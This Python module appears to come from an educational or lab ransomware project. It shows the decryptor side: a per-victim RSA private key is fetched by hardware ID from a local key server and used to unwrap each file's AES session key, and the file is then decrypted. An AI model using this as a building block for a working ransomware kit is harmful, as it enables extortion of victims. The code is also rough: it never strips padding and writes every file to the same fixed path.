from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_v1_5
import http.client
import logging
from .utils import get_hwid, is_binary_string
import json
import mimetypes

logger = logging.getLogger("ransomware")

AES_IV_SIZE = 16
RSA_DEFAULT_KEY_SIZE = 2048


class RSAAESDecryption:
    def __init__(self, **kwargs) -> None:
        self._hwid = get_hwid()
        self.rsa_key_size = kwargs.get("rsa_key_size", RSA_DEFAULT_KEY_SIZE)
        self.private_key = self._load_private_key()
        self.cipher_rsa = None
        self.cipher_aes = None
        self.session_key = None
        self.decipher_ready = False

    def _prepare_decipher(self, aes_mode: int, fpath: str):
        """
        Prepare the cipher

        :param aes_mode: The AES mode to use
        """
        if not self.decipher_ready:
            file_in = open(fpath, "rb")
            enc_session_key, iv, _ = \
                [file_in.read(x)
                 for x in (self.private_key.size_in_bytes(), AES_IV_SIZE, -1)]
            file_in.close()

            # Decrypt the session key with the private RSA key
            self.cipher_rsa = PKCS1_v1_5.new(self.private_key)
            self.session_key = self.cipher_rsa.decrypt(
                enc_session_key, "ERROR")
            self.cipher_aes = AES.new(self.session_key,
                                      aes_mode, iv=iv)
            self.decipher_ready = True
            logger.info("Decryption cipher ready!")

    def _read_cipheretext(self, fpath: str):
        file_in = open(fpath, "rb")
        _, _, ciphertext = \
            [file_in.read(x)
             for x in (self.private_key.size_in_bytes(), AES_IV_SIZE, -1)]
        file_in.close()
        return ciphertext

    def _load_private_key(self):
        """
        Load the private key from the key server

        :return: The private key
        """
        conn = http.client.HTTPConnection("localhost", 12001)
        conn.request("GET", f"/keys/private_key/{self._hwid}/")
        response = conn.getresponse()
        if response.status != 200:
            raise Exception("Failed to load private key")
        data = json.loads(response.read())
        logger.info("Private key loaded")
        return RSA.import_key(data["private_key"])

    def decrypt_file(self, fpath: str):
        """
        Decrypt a file

        :param fpath: The path to the file to decrypt

        :raises Exception: If an error occurs while decrypting the file
        """
        if not self.decipher_ready:
            self._prepare_decipher(AES.MODE_CBC, fpath)

        cipheretext = self._read_cipheretext(fpath)
        data = self.cipher_aes.decrypt(cipheretext)
        with open("tests/decrypted_files/file.txt", "wb+") as f:
            is_binary_string(data)
            f.write(data)
        logger.info("File decrypted", extra={"file": fpath})
